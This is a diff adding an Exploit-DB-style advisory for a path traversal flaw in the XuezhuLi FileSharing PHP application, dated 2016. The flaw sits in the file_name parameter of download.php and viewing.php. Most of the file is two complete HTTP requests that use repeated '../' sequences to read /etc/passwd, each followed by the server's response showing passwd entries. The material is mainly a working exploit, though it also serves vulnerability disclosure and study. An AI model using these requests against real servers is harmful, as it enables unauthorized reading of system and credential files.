@@ -1,0 +1,57 @@
+# Exploit Title: XuezhuLi FileSharing - Path Traversal Vulnerability
+# Date: 2016-06-23
+# Exploit Author: HaHwul
+# Exploit Author Blog: www.hahwul.com
+# Vendor Homepage: https://github.com/XuezhuLi
+# Software Link: https://github.com/XuezhuLi/FileSharing/archive/master.zip
+# Version: Latest commit
+# Tested on: Debian [wheezy]
+
+### Vulnerability
+ 1. download.php -> file_name parameter
+ 2. viewing.php  -> file_name parameter
+
+### Vulnerability 1 - download.php
+GET /vul_test/FileSharing/download.php?file_name=../../../../../../../../../../../../../etc/passwd HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:44.0) Gecko/20100101 Firefox/44.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://127.0.0.1/vul_test/FileSharing/userpage.php
+Cookie: W2=dgf6v5tn2ea8uitvk98m2tfjl7; __utma=96992031.1679083892.1466384142.1466384142.1466398535.2; __utmz=96992031.1466384142.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __atuvc=1%7C25; Hm_lvt_7b43330a4da4a6f4353e553988ee8a62=1466565345; bdshare_firstime=1466565462740; PHPSESSID=uetimns4scbtk46c8m6ab7upp1
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Date: Thu, 23 Jun 2016 06:17:58 GMT
+..snip..
+Content-Type: application/octet-stream
+
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+
+# ---- ---- ---- ---- ---- ---- ---- ---- ---- ---- ---- ---- ---- ---- ---- ---- ---- ----
+### Vulnerability 2 - viewing.php
+GET /vul_test/FileSharing/viewing.php?file_name=../../../../../../../../../../../../../etc/passwd HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:44.0) Gecko/20100101 Firefox/44.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://127.0.0.1/vul_test/FileSharing/userpage.php
+Cookie: W2=dgf6v5tn2ea8uitvk98m2tfjl7; __utma=96992031.1679083892.1466384142.1466384142.1466398535.2; __utmz=96992031.1466384142.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __atuvc=1%7C25; Hm_lvt_7b43330a4da4a6f4353e553988ee8a62=1466565345; bdshare_firstime=1466565462740; PHPSESSID=uetimns4scbtk46c8m6ab7upp1
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Date: Thu, 23 Jun 2016 06:19:49 GMT
+Server: Apache/2.4.10 (Ubuntu)
+..snip..
+Content-Type: text/plain;charset=UTF-8
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
